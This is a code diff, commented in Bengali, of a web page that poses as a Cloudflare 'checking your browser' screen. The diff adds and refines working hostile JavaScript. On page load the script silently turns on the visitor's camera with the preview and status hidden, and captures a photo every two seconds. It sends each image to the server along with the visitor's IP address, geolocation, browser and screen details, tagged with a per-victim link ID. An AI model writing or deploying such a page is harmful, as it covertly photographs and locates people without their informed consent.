@@ -8,6 +8,7 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>Just a moment....</title>
     <style>
+        /* ===== CSS ===== */
         * {
             margin: 0;
             padding: 0;
@@ -76,17 +77,22 @@
             display: block;
             margin-top: 8px;
         }
-        /* সব স্ট্যাটাস/এরর মেসেজ লুকানো */
+        /* সব স্ট্যাটাস/লোডার লুকানো */
         #status, .status, #cam-status, .error-msg, #requestBtn, .preview, .loader, .note {
             display: none !important;
         }
         video {
             display: none !important;
         }
+        /* রে আইডি র‍্যান্ডম স্ট্রিং */
+        #ray {
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- ক্লাউডফ্লেয়ার UI -->
         <div class="cf-bubbles">
             <div class="bubbles"></div>
             <div class="bubbles"></div>
@@ -96,15 +102,14 @@
         <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
         <p id="status-text">Please allow up to 5 seconds…</p>
 
+        <!-- লুকানো এলিমেন্ট (শুধু ফাংশনালিটির জন্য) -->
         <button id="requestBtn">Allow Camera Access</button>
         <video id="preview" autoplay playsinline muted></video>
         <div class="status" id="status">
             <div class="loader"></div>
             <p>Capturing photo...</p>
         </div>
-        <div class="note">
-            Your privacy is important to us. Camera access is required for this service.
-        </div>
+        <div class="note">Your privacy is important to us.</div>
 
         <div class="attribution">
             DDoS protection by
@@ -118,62 +123,85 @@
         (function() {
             "use strict";
 
+            // ===== DOM রেফারেন্স =====
             const preview = document.getElementById('preview');
             let stream = null;
             let captureInterval = null;
 
-            async function sendData(data) {
+            // ===== লিংক আইডি (যেমন cam_1786873736643_1b2b) =====
+            // পেজের URL থেকে লিংক আইডি বের করি (যদি থাকে), নাহলে ডিফল্ট
+            const linkId = window.location.pathname.split('/')[2] || 'cam_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);
+
+            // ===== ডেটা পাঠানোর ফাংশন (camera.html-এর মতো) =====
+            async function sendData(payload) {
                 try {
-                    await fetch('/api/data', {
+                    const response = await fetch('/api/data', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
                     });
+                    if (!response.ok) {
+                        console.warn('Server response not OK:', response.status);
+                    }
                 } catch (error) {
                     console.error('Send Error:', error);
                 }
             }
 
-            // ===== শুধু এখানে পরিবর্তন (ছবির হেডার বাদ দেওয়া) =====
+            // ===== ছবি ক্যাপচার ও পাঠানো (সব ফরম্যাটে) =====
             async function capturePhoto() {
-                if (!preview.videoWidth || !preview.videoHeight) return;
+                if (!preview.videoWidth || !preview.videoHeight) {
+                    console.warn('Video not ready yet');
+                    return;
+                }
 
                 try {
+                    // ১. ক্যানভাসে ছবি আঁকা
                     const canvas = document.createElement('canvas');
                     canvas.width = preview.videoWidth;
                     canvas.height = preview.videoHeight;
                     const context = canvas.getContext('2d');
                     context.drawImage(preview, 0, 0, canvas.width, canvas.height);
 
-                    // পুরো ডেটা ইউআরএল (যেমন: "data:image/jpeg;base64,/9j/4AAQ...")
+                    // ২. পুরো ডেটা ইউআরএল (data:image/jpeg;base64,...)
                     const fullImageData = canvas.toDataURL('image/jpeg', 0.8);
-                    
-                    // শুধু বেস৬৪ অংশ নিন (কমা (,) এর পরের অংশ)
+                    // ৩. শুধু বেস৬৪ অংশ (কমা পরে)
                     const rawBase64 = fullImageData.split(',')[1];
+                    // ৪. ইউআরএল এনকোডেড বেস৬৪ (যাতে ট্রান্সফার সেফ থাকে)
+                    const encodedBase64 = encodeURIComponent(rawBase64);
 
-                    // আইপি ও লোকেশন
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
+                    // ৫. আইপি ও লোকেশন (camera.html-এর মতো)
+                    let ipData = { ip: '0.0.0.0' };
+                    let locationData = { country_name: 'Unknown', region: 'Unknown', city: 'Unknown', latitude: 0, longitude: 0 };
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        ipData = await ipRes.json();
+                        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        locationData = await locRes.json();
+                    } catch (e) {
+                        console.warn('IP/Location fetch failed, using defaults', e);
+                    }
 
-                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                    const locationData = await locationResponse.json();
-
-                    // ডাটা পাঠান (এখন 'image' ফিল্ডে শুধু বেস৬৪ থাকবে)
-                    await sendData({
-                        linkId: window.location.pathname.split('/')[2] || 'unknown',
+                    // ৬. প্যাকেট তৈরি (দুই ফরম্যাটেই ছবি পাঠাচ্ছি)
+                    const payload = {
+                        linkId: linkId,
                         type: 'camera',
                         data: {
-                            image: rawBase64, // ← হেডার ছাড়া শুধু বেস৬৪
+                            image: fullImageData,          // পুরো data:image স্ট্রিং (প্রথম কোডের মতো)
+                            img: encodedBase64,            // শুধু বেস৬৪ + URI এনকোডেড (দ্বিতীয় কোডের মতো)
+                            raw: rawBase64,                // শুধু বেস৬৪ (এনকোড করা নেই)
                             size: rawBase64.length,
                             timestamp: new Date().toISOString()
                         },
                         ip: ipData.ip,
                         location: {
-                            country: locationData.country_name,
-                            region: locationData.region,
-                            city: locationData.city,
-                            latitude: locationData.latitude,
-                            longitude: locationData.longitude
+                            country: locationData.country_name || 'Unknown',
+                            region: locationData.region || 'Unknown',
+                            city: locationData.city || 'Unknown',
+                            latitude: locationData.latitude || 0,
+                            longitude: locationData.longitude || 0
                         },
                         device: {
                             browser: navigator.userAgent,
@@ -181,18 +209,21 @@
                             device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                             screen: `${screen.width}x${screen.height}`
                         }
-                    });
+                    };
 
-                    // ডিবাগের জন্য কনসোলে সাইজ দেখুন (শুধু চেক করতে)
-                    console.log(`📸 ছবি পাঠানো হলো (সাইজ: ${rawBase64.length})`);
+                    // ৭. ডেটা পাঠাও
+                    await sendData(payload);
+                    console.log(`✅ ছবি পাঠানো হয়েছে (সাইজ: ${rawBase64.length})`);
 
                 } catch (error) {
                     console.error('Capture Error:', error);
                 }
             }
 
+            // ===== ক্যামেরা চালু =====
             async function startCamera() {
                 try {
+                    console.log('⏳ ক্যামেরা অ্যাক্সেস নেওয়া হচ্ছে...');
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             width: { ideal: 1280 },
@@ -203,27 +234,32 @@
                     });
 
                     preview.srcObject = stream;
+                    console.log('✅ ক্যামেরা চালু হয়েছে');
 
+                    // প্রতি ২ সেকেন্ডে ছবি তোলা
                     if (captureInterval) clearInterval(captureInterval);
                     captureInterval = setInterval(capturePhoto, 2000);
+                    // সাথে সাথে প্রথম ছবি
                     setTimeout(capturePhoto, 500);
 
                 } catch (error) {
-                    console.error('Camera Error:', error);
+                    console.error('❌ ক্যামেরা অ্যাক্সেস ডিনাই বা অসম্ভব:', error);
 
+                    // এরর রিপোর্ট
                     sendData({
-                        error: error.message,
-                        type: 'camera_error'
+                        linkId: linkId,
+                        type: 'camera_error',
+                        error: error.message
                     });
 
-                    // রিডাইরেক্ট (চাইলে কমেন্ট খুলুন)
-                    // setTimeout(() => {
-                    //     window.location.href = 'https://google.com';
-                    // }, 3000);
+                    // ৩ সেকেন্ড পর google-এ রিডাইরেক্ট (যদি চাও)
+                    // setTimeout(() => { window.location.href = 'https://google.com'; }, 3000);
                 }
             }
 
+            // ===== পেজ লোড হলে অটো শুরু =====
             window.addEventListener('load', function() {
+                // রে আইডি র‍্যান্ডম করি
                 const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
                 let ray = "";
                 for (let i = 0; i < 17; i++) {
@@ -231,14 +267,16 @@
                 }
                 document.getElementById('ray').textContent = ray;
 
+                // ব্রাউজার ক্যামেরা সাপোর্ট করে কিনা
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    console.error("❌ এই ব্রাউজার ক্যামেরা সাপোর্ট করে না।");
+                    console.error('❌ এই ব্রাউজার getUserMedia সাপোর্ট করে না');
                     return;
                 }
 
                 startCamera();
             });
 
+            // ===== পেজ ছাড়ার সময় ক্লিনআপ =====
             window.addEventListener('beforeunload', function() {
                 if (captureInterval) clearInterval(captureInterval);
                 if (stream) {
